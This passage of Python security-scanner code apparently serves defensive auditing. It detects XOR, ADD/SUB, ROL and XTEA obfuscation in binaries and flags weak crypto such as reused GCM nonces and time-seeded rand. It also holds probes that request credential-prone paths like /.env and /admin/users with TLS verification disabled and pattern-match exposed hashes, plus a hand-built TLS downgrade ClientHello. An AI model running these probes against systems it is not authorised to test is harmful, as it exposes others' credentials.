                    f"alternating XOR AL,0x{k1:02X}/XOR AL,0x{k2:02X} pattern; "
                    "two-byte period key defeats single-byte brute-force "
                    "(PMA ch.13 multibyte XOR variant)"
                ),
                "host": "localhost",
                "port": 0,
            })

    return findings


def detect_arithmetic_encoding(binary_data: bytes) -> list:
    """
    Detect arithmetic-based encoding patterns in binary data.

    Techniques from PMA ch.13 (simple ciphers Table 13-4, custom encoding)
    and ch.19 (shellcode encodings):

      - ADD/SUB byte loop: ADD AL,imm8 (0x04) or SUB AL,imm8 (0x2C) within
        24 bytes of a short branch (JNZ/JZ/LOOP/JMP short) — PMA Table 13-4
        ADD/SUB scheme; ADD and SUB are not individually reversible so they
        must be paired for encode/decode symmetry.
      - ROT-n byte rotation: ROL/ROR r/m8 opcodes (0xC0/0xD0/0xD2 with ModRM
        0xC0-0xCF targeting 8-bit registers) — PMA Table 13-4 ROL/ROR scheme;
        rotation obfuscation is space-efficient and common in shellcode stubs.
      - Multi-stage encoding: XOR byte opcode within 256 bytes of an ADD/SUB
        loop, or XOR byte opcode within 64 bytes of a zlib deflate header —
        PMA ch.13 custom encoding: "layer multiple simple encoding methods."
      - XTEA delta constant 0x9e3779b9: golden-ratio delta present in every
        XTEA round; non-standard cipher choice (vs. AES) indicates obfuscation
        intent; detected in both little-endian and big-endian byte orders.

    Returns list of {severity, title, detail, host, port}.
    """
    findings = []
    if not binary_data:
        return findings

    # ── 1. ADD/SUB byte loop ──────────────────────────────────────────────────
    # ADD AL, imm8 = 0x04 imm8 (imm8 nonzero; zero ADD is a NOP-equivalent).
    # SUB AL, imm8 = 0x2C imm8. A tight encoding loop pairs one of these with
    # a conditional/unconditional short branch to close the loop:
    #   JNZ=0x75, JZ=0x74, LOOP=0xE2, JMP short=0xEB.
    # Detection: ADD/SUB AL instruction within ±24 bytes of any branch opcode.
    add_sub_re = re.compile(rb'(?:\x04[\x01-\xFF]|\x2C[\x01-\xFF])')
    branch_re = re.compile(rb'[\x74\x75\xE2\xEB]')

    asm_hit = None
    asm_mnemonic = ""
    asm_imm = 0
    for am in add_sub_re.finditer(binary_data):
        region_start = max(0, am.start() - 24)
        region_end = min(len(binary_data), am.end() + 24)
        if branch_re.search(binary_data[region_start:region_end]):
            asm_hit = am.start()
            asm_mnemonic = "ADD" if binary_data[am.start()] == 0x04 else "SUB"
            asm_imm = binary_data[am.start() + 1] if am.start() + 1 < len(binary_data) else 0
            break

    if asm_hit is not None:
        findings.append({
            "severity": "MEDIUM",
            "title": "ARITHMETIC_ADD_ENCODE",
            "detail": (
                f"{asm_mnemonic} AL,0x{asm_imm:02X} loop at offset "
                f"{asm_hit:#010x} — arithmetic ADD/SUB per-byte encoding "
                "loop with branch instruction; PMA ch.13 Table 13-4 scheme: "
                "not self-reversible, requires paired inverse for decode"
            ),
            "host": "localhost",
            "port": 0,
        })

    # ── 2. ROT-n byte rotation ────────────────────────────────────────────────
    # x86 rotate opcodes targeting 8-bit registers (ModRM 0xC0-0xCF):
    #   0xC0 ModRM imm8 — ROL/ROR r8, imm8  (mod=11, reg=000-111 → ROL/ROR)
    #     ModRM 0xC0-0xC7 = ROL; 0xC8-0xCF = ROR.
    #   0xD0 ModRM      — ROL/ROR r8, 1     (shift count=1, implicit)
    #   0xD2 ModRM      — ROL/ROR r8, CL    (shift count from CL)
    # imm8 1-7 are the only useful rotation counts for obfuscation; 0 and 8
    # are no-ops on 8-bit registers.
    rot_re = re.compile(
        rb'(?:'
        rb'\xC0[\xC0-\xCF][\x01-\x07]'   # ROL/ROR r8, imm3 (1–7)
        rb'|\xD0[\xC0-\xCF]'              # ROL/ROR r8, 1 (implicit)
        rb'|\xD2[\xC0-\xCF]'             # ROL/ROR r8, CL
        rb')'
    )
    rot_m = rot_re.search(binary_data)
    if rot_m:
        modrm = binary_data[rot_m.start() + 1]
        direction = "ROL" if modrm <= 0xC7 else "ROR"
        findings.append({
            "severity": "MEDIUM",
            "title": "ROT_BYTE_ENCODE",
            "detail": (
                f"{direction} byte instruction at offset {rot_m.start():#010x} — "
                "ROT-n bit rotation on 8-bit register operand; PMA ch.13 "
                "Table 13-4 ROL/ROR obfuscation scheme; paired ROL+ROR "
                "required to encode and decode symmetrically"
            ),
            "host": "localhost",
            "port": 0,
        })

    # ── 3. Multi-stage encoding (XOR + arithmetic, or XOR + compress) ─────────
    # PMA ch.13 custom encoding: "layer multiple simple encoding methods;
    # e.g., one round of XOR then Base64." Detect two signatures:
    #   (a) XOR byte opcode within 256 bytes of the ADD/SUB loop hit above.
    #   (b) XOR byte opcode within 64 bytes of a zlib deflate magic header:
    #       0x78 0x9C (default), 0x78 0xDA (best), 0x78 0x01 (none/low),
    #       0x78 0x5E (fast). Presence of zlib after XOR indicates XOR+compress
    #       layering — the zlib blob itself is the output of an XOR pre-pass.
    xor_scan_re = re.compile(rb'[\x30\x32\x34]')
    zlib_magic = [b'\x78\x9C', b'\x78\xDA', b'\x78\x01', b'\x78\x5E']

    multi_hit = None
    multi_reason = ""

    if asm_hit is not None:
        for xm in xor_scan_re.finditer(binary_data):
            if abs(xm.start() - asm_hit) <= 256:
                multi_hit = min(xm.start(), asm_hit)
                multi_reason = "XOR opcode + ADD/SUB loop within 256 bytes"
                break

    if multi_hit is None:
        for xm in xor_scan_re.finditer(binary_data):
            region_end = min(len(binary_data), xm.start() + 64)
            region = binary_data[xm.start():region_end]
            for zh in zlib_magic:
                if zh in region:
                    multi_hit = xm.start()
                    multi_reason = (
                        f"XOR opcode followed by zlib deflate header "
                        f"0x{zh.hex().upper()} within 64 bytes"
                    )
                    break
            if multi_hit is not None:
                break

    if multi_hit is not None:
        findings.append({
            "severity": "HIGH",
            "title": "MULTISTAGE_ENCODE",
            "detail": (
                f"Multi-stage encoding at offset {multi_hit:#010x} — "
                f"{multi_reason}; PMA ch.13 layered encoding: XOR + "
                "arithmetic or XOR + compress; requires tracing full "
                "execution path to reconstruct decode chain"
            ),
            "host": "localhost",
            "port": 0,
        })

    # ── 4. XTEA delta constant 0x9e3779b9 ─────────────────────────────────────
    # XTEA (eXtended Tiny Encryption Algorithm) uses delta = 0x9E3779B9 in
    # every round (derived from the golden ratio phi = (sqrt(5)-1)/2 * 2^32).
    # The same constant appears in TEA and several custom derivatives.
    # Non-standard cipher choice (vs. AES/ChaCha20) in a binary binary is a
    # strong indicator of obfuscation intent; XTEA's 64-round structure makes
    # it slow enough to notice under dynamic analysis but fast enough to embed
    # in shellcode. Both LE and BE byte orders are checked.
    xtea_le = struct.pack("<I", 0x9E3779B9)  # b'\xb9\x79\x37\x9e'
    xtea_be = struct.pack(">I", 0x9E3779B9)  # b'\x9e\x37\x79\xb9'

    xtea_off = binary_data.find(xtea_le)
    if xtea_off != -1:
        byte_order = "LE"
    else:
        xtea_off = binary_data.find(xtea_be)
        byte_order = "BE"

    if xtea_off != -1:
        findings.append({
            "severity": "HIGH",
            "title": "XTEA_ENCODE",
            "detail": (
                f"XTEA delta constant 0x9E3779B9 ({byte_order}) at offset "
                f"{xtea_off:#010x} — XTEA/TEA cipher embedded; golden-ratio "
                "delta present in every round; non-standard cipher choice "
                "indicates obfuscation rather than security-compliant "
                "encryption (use AES-GCM or ChaCha20-Poly1305 instead)"
            ),
            "host": "localhost",
            "port": 0,
        })

    return findings


def detect_gcm_nonce_misuse(binary_data: bytes) -> list:
    """Detect AES-GCM nonce reuse and authentication bypass patterns.

    Checks:
      1. All-zero 12-byte GCM nonce (keystream reuse when key shared).
      2. Static/hardcoded non-zero 12-byte nonce appearing 2+ times near
         a GCM cipher reference (nonce reuse => keystream reuse).
      3. GCM decrypt path present without a tag-verification symbol
         (authentication bypass).

    Args:
        binary_data: Raw bytes of the target binary.

    Returns:
        List of finding dicts {severity, title, detail, host, port}.
    """
    import re as _re
    import struct as _struct

    findings = []

    # ── 1. All-zero 12-byte GCM nonce ────────────────────────────────────────
    # RFC 5116 and NIST SP 800-38D require each (key, nonce) pair to be used
    # at most once.  An all-zero 12-byte IV is a common placeholder or
    # copy-paste default that causes keystream reuse across sessions sharing
    # the same key: XOR of two ciphertexts directly yields P1 XOR P2, and
    # the authentication tag is computable without the key.
    zero_nonce = b'\x00' * 12
    zero_hits = []
    start = 0
    while True:
        idx = binary_data.find(zero_nonce, start)
        if idx == -1:
            break
        zero_hits.append(idx)
        start = idx + 12  # non-overlapping scan

    if zero_hits:
        findings.append({
            "severity": "CRITICAL",
            "title": "AES_GCM_ZERO_NONCE",
            "detail": (
                f"All-zero 12-byte GCM nonce at {len(zero_hits)} location(s), "
                f"first at offset {zero_hits[0]:#010x} — AES-GCM with all-zero "
                "nonce causes keystream reuse if the same key is used across "
                "sessions; XOR of two ciphertexts directly yields P1 XOR P2; "
                "authentication tag forgery trivial from known-plaintext; "
                "NIST SP 800-38D §8 nonce-uniqueness requirement violated"
            ),
            "host": "localhost",
            "port": 0,
        })

    # ── 2. Static/hardcoded non-zero 12-byte nonce near GCM marker ───────────
    # Locate GCM string markers in the binary, then collect 12-byte aligned
    # chunks from a ±256-byte window around each marker.  If any chunk
    # appears at 2+ distinct offsets in the full binary, it is a hardcoded
    # literal rather than a freshly-generated nonce.  Entropy filter (>=4
    # distinct byte values) suppresses padding runs (e.g. b'\xff' * 12).
    gcm_strings = [
        b'AES-GCM', b'aes-gcm', b'AES_GCM', b'aes_gcm',
        b'EVP_aes_128_gcm', b'EVP_aes_256_gcm', b'EVP_aes_192_gcm',
        b'GCM_IV', b'gcm_iv', b'GCMEncrypt', b'gcmEncrypt',
        b'AES/GCM', b'aes/gcm',
    ]
    gcm_positions = []
    for marker in gcm_strings:
        pos = 0
        while True:
            idx = binary_data.find(marker, pos)
            if idx == -1:
                break
            gcm_positions.append(idx)
            pos = idx + len(marker)

    if gcm_positions:
        nonce_window = 256
        seen_candidates: set = set()
        static_hit = None
        for gpos in gcm_positions:
            lo = max(0, gpos - nonce_window)
            hi = min(len(binary_data) - 12, gpos + nonce_window)
            for i in range(lo, hi, 4):
                chunk = binary_data[i:i + 12]
                if len(chunk) < 12 or chunk == zero_nonce:
                    continue
                if len(set(chunk)) < 4:  # skip low-entropy padding runs
                    continue
                if chunk in seen_candidates:
                    continue
                seen_candidates.add(chunk)
                first_off = binary_data.find(chunk)
                second_off = binary_data.find(chunk, first_off + 1)
                if second_off != -1:
                    static_hit = (chunk, first_off, second_off)
                    break
            if static_hit:
                break

        if static_hit:
            nonce_bytes, off1, off2 = static_hit
            findings.append({
                "severity": "CRITICAL",
                "title": "AES_GCM_STATIC_NONCE",
                "detail": (
                    f"Hardcoded 12-byte GCM nonce {nonce_bytes.hex()} at offsets "
                    f"{off1:#010x} and {off2:#010x} near GCM cipher reference — "
                    "AES-GCM with static nonce enables keystream reuse: two "
                    "plaintexts encrypted under the same (key, nonce) pair leak "
                    "P1 XOR P2; authentication tag computed over identical prefix "
                    "allows forgery; use os.urandom(12) or a monotonic counter "
                    "(RFC 5116 §3, NIST SP 800-38D §8)"
                ),
                "host": "localhost",
                "port": 0,
            })

    # ── 3. GCM decryption without authentication tag verification ────────────
    # In OpenSSL the caller must invoke EVP_CIPHER_CTX_ctrl with
    # EVP_CTRL_GCM_GET_TAG before EVP_DecryptFinal_ex and must check its
    # return value; skipping this step accepts unauthenticated ciphertext.
    # mbedTLS/wolfSSL expose dedicated authenticated-decrypt functions; their
    # absence alongside a generic decrypt call is equally suspicious.
    gcm_decrypt_syms = [
        b'EVP_DecryptFinal',
        b'gcm_decrypt',
        b'GCM_decrypt',
        b'AES_GCM_decrypt',
        b'aes_gcm_dec',
        b'GCMDecrypt',
    ]
    gcm_tag_verify_syms = [
        b'GCM_GET_TAG',
        b'gcm_get_tag',
        b'CTRL_GCM_GET',
        b'mbedtls_gcm_auth_decrypt',
        b'wc_AesGcmDecrypt',
        b'CheckAuthTag',
        b'check_auth_tag',
        b'verify_tag',
        b'VERIFY_TAG',
    ]
    has_gcm_decrypt = any(sym in binary_data for sym in gcm_decrypt_syms)
    has_tag_verify = any(sym in binary_data for sym in gcm_tag_verify_syms)

    if has_gcm_decrypt and not has_tag_verify:
        findings.append({
            "severity": "HIGH",
            "title": "AES_GCM_AUTH_TAG_SKIP",
            "detail": (
                "GCM decryption symbol present without tag-verification symbol — "
                "AES-GCM decryption skipping authentication tag check removes "
                "AEAD integrity guarantee; attacker can flip arbitrary ciphertext "
                "bits and the tampered plaintext is accepted; equivalent to bare "
                "AES-CTR without a MAC; call EVP_CIPHER_CTX_ctrl with "
                "EVP_CTRL_GCM_GET_TAG and verify the result before processing "
                "any decrypted output"
            ),
            "host": "localhost",
            "port": 0,
        })

    return findings


def detect_weak_random_for_crypto(binary_data: bytes) -> list:
    """Detect weak or predictable randomness sources used for cryptographic material.

    Checks:
      1. rand()/srand() co-occurrence with key/IV/nonce/secret labels.
      2. time()-seeded PRNG (srand(time) source pattern or symbol proximity).
      3. GetTickCount / timeGetTime as entropy source (Windows, 32-bit state).
      4. Hardcoded salt bytes adjacent to a password-hash function symbol.

    Args:
        binary_data: Raw bytes of the target binary.

    Returns:
        List of finding dicts {severity, title, detail, host, port}.
    """
    import re as _re
    import struct as _struct

    findings = []

    # ── 1. rand() / srand() near cryptographic key / IV labels ───────────────
    # rand() is a linear congruential generator (LCG) with at most 32-bit
    # internal state; it is not a cryptographically secure PRNG.  Detecting
    # a rand* symbol within a 128-byte window of a key/IV/nonce/secret label
    # indicates the LCG output is being used to generate cryptographic material.
    rand_syms = [b'rand\x00', b'srand\x00', b'rand(', b'srand(']
    crypto_labels = [
        b'key\x00', b'KEY\x00', b'_key\x00', b'key_',
        b'nonce', b'NONCE', b'iv\x00', b'IV\x00', b'_iv\x00',
        b'secret', b'SECRET', b'cipher_key', b'aes_key',
    ]
    rand_hit = None
    proximity = 128
    for rsym in rand_syms:
        pos = 0
        while True:
            ridx = binary_data.find(rsym, pos)
            if ridx == -1:
                break
            lo = max(0, ridx - proximity)
            hi = min(len(binary_data), ridx + proximity)
            region = binary_data[lo:hi]
            for clabel in crypto_labels:
                if clabel in region:
                    rand_hit = (ridx, rsym, clabel)
                    break
            if rand_hit:
                break
            pos = ridx + 1
        if rand_hit:
            break

    if rand_hit:
        off, rsym, clabel = rand_hit
        rsym_clean = rsym.rstrip(b'\x00').rstrip(b'(').decode(errors='replace')
        clabel_clean = clabel.strip(b'\x00').strip(b'_').decode(errors='replace')
        findings.append({
            "severity": "CRITICAL",
            "title": "WEAK_RAND_FOR_CRYPTO",
            "detail": (
                f"'{rsym_clean}' at offset {off:#010x} within {proximity} bytes "
                f"of '{clabel_clean}' label — rand()/srand() used for "
                "cryptographic key or IV generation; LCG with at most 32-bit "
                "state; full seed space enumerable in <10 s on commodity "
                "hardware; all derived keys and IVs compromised; replace with "
                "getrandom() / /dev/urandom (NIST SP 800-90A Rev.1 §8.6)"
            ),
            "host": "localhost",
            "port": 0,
        })

    # ── 2. time() as PRNG seed for cryptographic material ────────────────────
    # srand(time(NULL)) seeds a 32-bit LCG with a Unix timestamp; the seed
    # space is enumerable in seconds.  Certificate / token issuance time
    # (NotBefore, iat) narrows the window further: a window of ±minutes
    # reduces the search to O(hundreds) of candidates.
    time_seed_patterns = [
        b'srand(time',
        b'time(0)',
        b'time(NULL)',
        b'time(0L)',
    ]
    time_hit = None
    for pat in time_seed_patterns:
        idx = binary_data.find(pat)
        if idx != -1:
            time_hit = (idx, pat)
            break

    # Compiled-binary fallback: time\0 and srand\0 symbols within 512 bytes
    if time_hit is None:
        t_idx = binary_data.find(b'time\x00')
        s_idx = binary_data.find(b'srand\x00')
        if t_idx != -1 and s_idx != -1 and abs(t_idx - s_idx) <= 512:
            time_hit = (min(t_idx, s_idx), b'time/srand symbol proximity')

    if time_hit:
        off, pat = time_hit
        findings.append({
            "severity": "CRITICAL",
            "title": "TIME_SEEDED_CRYPTO_RNG",
            "detail": (
                f"time()-seeded PRNG at offset {off:#010x} "
                f"(pattern: '{pat.decode(errors='replace')}') — "
                "Unix timestamp seed limits entropy to 32 bits; artifact "
                "issuance time (cert NotBefore / JWT iat) narrows candidate "
                "window to O(3 600) guesses; all derived keys, IVs, and "
                "nonces recoverable; FIPS 140-3 IG C.A: time-based seeding "
                "prohibited for approved cryptographic randomness sources"
            ),
            "host": "localhost",
            "port": 0,
        })

    # ── 3. GetTickCount / timeGetTime as entropy source ───────────────────────
    # Windows GetTickCount() returns milliseconds since boot as a DWORD
    # (32-bit, wraps every 49.7 days).  Tick granularity is ~15 ms on
    # pre-Win8 systems; effective entropy is bounded by observable uptime,
    # reducing the seed space to O(uptime_ms / tick_interval) — often < 2^24.
    tick_syms = [
        b'GetTickCount\x00',
        b'GetTickCount64\x00',
        b'timeGetTime\x00',
        b'GetTickCount',
        b'GetTickCount64',
        b'timeGetTime',
    ]
    tick_hit = None
    for sym in tick_syms:
        idx = binary_data.find(sym)
        if idx != -1:
            tick_hit = (idx, sym.rstrip(b'\x00'))
            break

    if tick_hit:
        off, sym = tick_hit
        findings.append({
            "severity": "HIGH",
            "title": "TICK_COUNT_CRYPTO_SEED",
            "detail": (
                f"'{sym.decode()}' at offset {off:#010x} — "
                "GetTickCount used as entropy source for cryptographic material; "
                "32-bit state, ~15 ms tick granularity pre-Win8, predictable "
                "from system uptime sidechannel; attacker enumerates seed space "
                "in O(uptime / tick_interval) guesses; replace with "
                "BCryptGenRandom or CryptGenRandom (Windows CNG)"
            ),
            "host": "localhost",
            "port": 0,
        })

    # ── 4. Hardcoded salt near password-hash function ─────────────────────────
    # A fixed salt embedded in the binary defeats per-credential salting: all
    # password hashes share the same salt, so a single precomputed rainbow
    # table attacks every stored hash simultaneously.  Detection heuristic:
    # password-hash function symbol + 'salt' label + a high-entropy non-ASCII
    # 8-byte literal within a ±256-byte window of the hash symbol.
    hash_syms = [
        b'PBKDF2', b'pbkdf2',
        b'bcrypt', b'bcrypt_hashpw',
        b'scrypt',
        b'Argon2', b'argon2',
        b'SHA256', b'sha256',
        b'SHA512', b'sha512',
        b'HashPassword', b'hash_password',
        b'crypt\x00',
    ]
    salt_labels = [b'salt', b'SALT', b'Salt', b'_salt', b'salt_']
    fixed_salt_hit = None
    salt_window = 256

    for hsym in hash_syms:
        hidx = binary_data.find(hsym)
        if hidx == -1:
            continue
        lo = max(0, hidx - salt_window)
        hi = min(len(binary_data), hidx + salt_window)
        region = binary_data[lo:hi]
        if not any(slbl in region for slbl in salt_labels):
            continue
        # Scan for a non-ASCII, high-entropy 8-byte literal (likely a salt value)
        for j in range(0, len(region) - 8, 4):
            chunk = region[j:j + 8]
            if b'\x00' in chunk:
                continue
            try:
                chunk.decode('ascii')
                continue  # pure ASCII -> string label, not a binary salt
            except UnicodeDecodeError:
                pass
            if len(set(chunk)) >= 4:
                fixed_salt_hit = (lo + j, hsym, chunk)
                break
        if fixed_salt_hit:
            break

    if fixed_salt_hit:
        off, hsym, salt_sample = fixed_salt_hit
        hsym_clean = hsym.rstrip(b'\x00').decode(errors='replace')
        findings.append({
            "severity": "HIGH",
            "title": "FIXED_SALT_PASSWORD_HASH",
            "detail": (
                f"Hardcoded salt candidate {salt_sample.hex()} at offset "
                f"{off:#010x} near '{hsym_clean}' — fixed salt in password "
                "hashing allows a single precomputed rainbow table to crack "
                "all stored hashes simultaneously; per-credential random salt "
                "(>= 128 bits) required; NIST SP 800-132 §5.1: salt must be "
                "random and unique per password derivation call"
            ),
            "host": "localhost",
            "port": 0,
        })

    return findings


def probe_password_hash_disclosure(host: str, port: int = 80, timeout: float = 10.0) -> list:
    """Detect password hash or credential disclosure in web application responses.

    Derived from Security Engineering 3rd ed. Chapter 5 (Cryptography) on hash
    function weaknesses -- broken algorithms (MD5, SHA1) vs. proper KDFs -- and
    Chapter 4 (Protocols) on credential exposure risks in authentication protocols.
    Tests common web endpoints for inadvertently exposed password hashes or
    base64-encoded credentials in API responses.

    Returns List[dict] with keys: severity, title, detail, host, port.
    """
    findings = []

    endpoints = [
        "/api/users",
        "/api/v1/users",
        "/admin/users",
        "/user/profile",
        "/account",
        "/api/config",
        "/config.json",
        "/settings",
        "/.env",
        "/api/settings",
    ]

    scheme = "https" if port == 443 else "http"

    # Compiled regex patterns for various hash formats
    md5_pat = re.compile(r'\b([a-f0-9]{32})\b')
    sha1_pat = re.compile(r'\b([a-f0-9]{40})\b')
    bcrypt_pat = re.compile(r'\$2[abxy]\$\d{2}\$[./A-Za-z0-9]{53}')
    ntlm_pat = re.compile(r'\b([a-f0-9]{32}:[a-f0-9]{32})\b')
    modern_hash_pat = re.compile(r'\$(scrypt|argon2[id])\$')
    b64_cred_pat = re.compile(
        r'(?i)(password|passwd|secret)\s*[=:]\s*[A-Za-z0-9+/]{16,}={0,2}'
    )
    # Keywords that give password context to otherwise ambiguous hex strings
    pw_context_pat = re.compile(r'(?i)(password|passwd|hash|credential|secret|pwd)')

    import ssl as _ssl
    import urllib.request as _urlreq
    import urllib.error as _urlerr

    ctx = _ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = _ssl.CERT_NONE

    for endpoint in endpoints:
        url = f"{scheme}://{host}:{port}{endpoint}"
        try:
            req = _urlreq.Request(
                url,
                headers={
                    "User-Agent": "Mozilla/5.0 (compatible; SecurityAudit/1.0)",
                    "Accept": "application/json, text/html, */*",
                },
            )
            if scheme == "https":
                response = _urlreq.urlopen(req, timeout=timeout, context=ctx)
            else:
                response = _urlreq.urlopen(req, timeout=timeout)

            if response.status not in (200, 201, 206):
                continue

            # Cap read at 512 KB to avoid runaway memory on large responses
            body = response.read(524288).decode("utf-8", errors="replace")
            resp_headers = {k.lower(): v for k, v in response.headers.items()}

            # Authorization header must never appear in a response
            if "authorization" in resp_headers:
                findings.append({
                    "severity": "CRITICAL",
                    "title": "AUTH_HEADER_IN_RESPONSE",
                    "detail": (
                        f"Server returned an Authorization header in response to "
                        f"GET {endpoint} at {host}:{port} -- credentials must "
                        "never appear in HTTP response headers; immediate rotation "
                        "required; Security Engineering §4.2: credentials in transit "
                        "are the primary target of passive eavesdropping attacks"
                    ),
                    "host": host,
                    "port": port,
                })

            # MD5 hashes with password-field context
            md5_hits = md5_pat.findall(body)
            if md5_hits and pw_context_pat.search(body):
                findings.append({
                    "severity": "CRITICAL",
                    "title": "MD5_HASH_DISCLOSED",
                    "detail": (
                        f"GET {endpoint} at {host}:{port} returned "
                        f"{len(md5_hits)} MD5-length hex string(s) "
                        f"(sample: {md5_hits[0][:8]}...) alongside password-related "
                        "field names -- MD5 is cryptographically broken for password "
                        "storage; precomputed rainbow tables crack unsalted MD5 "
                        "instantly; Security Engineering §5.6: password storage "
                        "requires a slow KDF (bcrypt/Argon2/scrypt), not a raw hash"
                    ),
                    "host": host,
                    "port": port,
                })

            # SHA1 hashes with password-field context
            sha1_hits = sha1_pat.findall(body)
            if sha1_hits and pw_context_pat.search(body):
                findings.append({
                    "severity": "HIGH",
                    "title": "SHA1_HASH_DISCLOSED",
                    "detail": (
                        f"GET {endpoint} at {host}:{port} returned "
                        f"{len(sha1_hits)} SHA1-length hex string(s) "
                        f"(sample: {sha1_hits[0][:8]}...) alongside password-related "
                        "field names -- SHA1 without per-credential salt is trivially "
                        "crackable via precomputed tables; endpoint may be exposing "
                        "stored credential hashes to unauthenticated API consumers"
                    ),
                    "host": host,
                    "port": port,
                })

            # bcrypt hashes -- correct KDF but still a disclosure violation
            bcrypt_hits = bcrypt_pat.findall(body)
            if bcrypt_hits:
                findings.append({
                    "severity": "HIGH",
                    "title": "BCRYPT_HASH_DISCLOSED",
                    "detail": (
                        f"GET {endpoint} at {host}:{port} returned "
                        f"{len(bcrypt_hits)} bcrypt hash string(s) "
                        f"(sample: {bcrypt_hits[0][:20]}...) -- bcrypt is an "
                        "appropriate KDF, but returning stored password hashes to "
                        "API clients is a data minimization violation and enables "
                        "offline cracking attempts at the known work factor"
                    ),
                    "host": host,
                    "port": port,
                })

            # NTLM hashes -- direct pass-the-hash vector
            ntlm_hits = ntlm_pat.findall(body)
            if ntlm_hits:
                findings.append({
                    "severity": "CRITICAL",
                    "title": "NTLM_HASH_DISCLOSED",
                    "detail": (
                        f"GET {endpoint} at {host}:{port} returned "
                        f"{len(ntlm_hits)} NTLM-format hash pair(s) "
                        f"(sample: {ntlm_hits[0][:16]}...) -- LM:NT pairs enable "
                        "pass-the-hash lateral movement on Windows networks without "
                        "cracking; Security Engineering §4.3: authentication tokens "
                        "exposed in transit or API responses become impersonation keys"
                    ),
                    "host": host,
                    "port": port,
                })

            # Modern KDF strings (scrypt, argon2) -- disclosure, not algorithm failure
            modern_hits = modern_hash_pat.findall(body)
            if modern_hits:
                findings.append({
                    "severity": "MEDIUM",
                    "title": "MODERN_HASH_DISCLOSED",
                    "detail": (
                        f"GET {endpoint} at {host}:{port} returned "
                        f"{len(modern_hits)} modern KDF encoded string(s) "
                        f"({modern_hits[0]}) -- scrypt/Argon2 are appropriate KDFs "
                        "but exposing any stored credential representation to API "
                        "consumers violates data minimization; offline cracking at "
                        "disclosed parameters remains feasible with sufficient resources"
                    ),
                    "host": host,
                    "port": port,
                })

            # Base64-encoded credentials (encoding != encryption)
            b64_hits = b64_cred_pat.findall(body)
            if b64_hits:
                field_name = b64_hits[0][0]
                findings.append({
                    "severity": "CRITICAL",
                    "title": "BASE64_CREDENTIAL_DISCLOSED",
                    "detail": (
                        f"GET {endpoint} at {host}:{port} returned a credential-labeled "
                        f"base64 value (field: '{field_name}') -- base64 is a transport "
                        "encoding, not encryption; decoding is trivial and immediate; "
                        "Security Engineering §5: confusion of encoding and encryption "
                        "is a recurring implementation failure; rotate credential "
                        "immediately and audit all callers of this endpoint"
                    ),
                    "host": host,
                    "port": port,
                })

        except Exception:
            continue

    return findings


def detect_protocol_downgrade_surface(
    host: str, port: int = 443, timeout: float = 10.0
) -> list:
    """Detect protocol downgrade vulnerability surface in TLS and HTTP stack.

    Derived from Security Engineering 3rd ed. Chapter 4 (Protocols) §4.6
    (chosen-protocol attacks, MIG-in-the-middle relay attacks) and Chapter 5
    (Cryptography) on version negotiation weaknesses. Tests:
      - TLS_FALLBACK_SCSV enforcement (RFC 7507)
      - HTTP -> HTTPS redirect presence and permanence
      - HSTS header configuration (max-age, includeSubDomains, preload)
      - HTTP/2 ALPN negotiation support

    Returns List[dict] with keys: severity, title, detail, host, port.
    """
    import ssl as _ssl
    import socket as _socket
    import struct as _struct
    import urllib.request as _urlreq
    import urllib.error as _urlerr

    findings = []

    # ── 1. TLS Fallback SCSV enforcement (RFC 7507) ───────────────────────────
    # Security Engineering §4.6: chosen-protocol attacks exploit the version
    # negotiation phase. RFC 7507 defines TLS_FALLBACK_SCSV (0x5600) as a
    # sentinel in the ClientHello cipher list signalling a deliberate downgrade.
    # A server that supports a higher version MUST reject the handshake with an
    # inappropriate_fallback alert (TLS alert level=2 / desc=86).
    # Absence of this alert means the server silently accepts version downgrades.
    try:
        random_bytes = os.urandom(32)

        # Cipher suite list: TLS_FALLBACK_SCSV (0x5600) + one real suite
        cipher_suites = _struct.pack("!HH", 0x5600, 0x002F)  # 0x002F = RSA/AES128-CBC-SHA
        cs_len = _struct.pack("!H", len(cipher_suites))

        # ClientHello body: advertise TLS 1.1 (0x0302) to signal a downgrade
        ch_body = (
            b'\x03\x02'      # client_version = TLS 1.1 (deliberate downgrade)
            + random_bytes   # 32-byte client random
            + b'\x00'        # session_id length = 0
            + cs_len
            + cipher_suites
            + b'\x01\x00'   # compression_methods: length=1, null(0)
        )

        # Handshake message: type=ClientHello(1), 3-byte length
        ch_len_3 = _struct.pack("!I", len(ch_body))[1:]
        handshake_msg = b'\x01' + ch_len_3 + ch_body

        # TLS record: content_type=Handshake(0x16), version=TLS1.0(0x0301)
        record = _struct.pack("!BHH", 0x16, 0x0301, len(handshake_msg)) + handshake_msg

        with _socket.create_connection((host, port), timeout=timeout) as sock:
            sock.sendall(record)
            # Read enough for one record header (5 bytes) + alert body (2 bytes)
            buf = b''
            while len(buf) < 7:
                chunk = sock.recv(7 - len(buf))
                if not chunk:
                    break
                buf += chunk

        if len(buf) >= 7:
            content_type = buf[0]
            alert_level = buf[5]
            alert_desc = buf[6]

            if content_type == 0x15 and alert_level == 2 and alert_desc == 86:
                # Correct behaviour: inappropriate_fallback alert received
                pass
            elif content_type == 0x16:
                # Server sent a ServerHello -- downgrade accepted without objection
                findings.append({
                    "severity": "HIGH",
                    "title": "TLS_FALLBACK_SCSV_NOT_ENFORCED",
                    "detail": (
                        f"Server at {host}:{port} accepted a TLS 1.1 ClientHello "
                        "containing TLS_FALLBACK_SCSV (0x5600, RFC 7507) without "
                        "returning an inappropriate_fallback alert (level=fatal, "
                        "desc=86) -- protocol downgrade attacks (POODLE, DROWN) may "
                        "be feasible; Security Engineering §4.6: chosen-protocol "
                        "attacks work when the server does not guard version "
                        "negotiation; enforce TLS 1.2+ minimum and enable SCSV"
                    ),
                    "host": host,
                    "port": port,
                })
    except Exception:
        pass

    # ── 2. HTTP -> HTTPS redirect check ───────────────────────────────────────
    # Security Engineering §4.2: eavesdropping on plaintext channels requires
    # no cryptanalysis -- only a network tap. All HTTP requests should redirect
    # to HTTPS. Temporary (302) redirects are not cached and leave every initial
    # request exposed to SSLstrip.
    try:
        http_url = f"http://{host}:80/"
        req = _urlreq.Request(
            http_url,
            headers={"User-Agent": "Mozilla/5.0 (compatible; SecurityAudit/1.0)"},
        )

        class _NoRedirect(_urlreq.HTTPRedirectHandler):
            def redirect_request(self, req, fp, code, msg, headers, newurl):
                return None

        opener = _urlreq.build_opener(_NoRedirect)
        redir_status = None
        try:
            redir_resp = opener.open(req, timeout=timeout)
            redir_status = redir_resp.status
        except _urlerr.HTTPError as exc:
            redir_status = exc.code

        if redir_status == 200:
            findings.append({
                "severity": "HIGH",
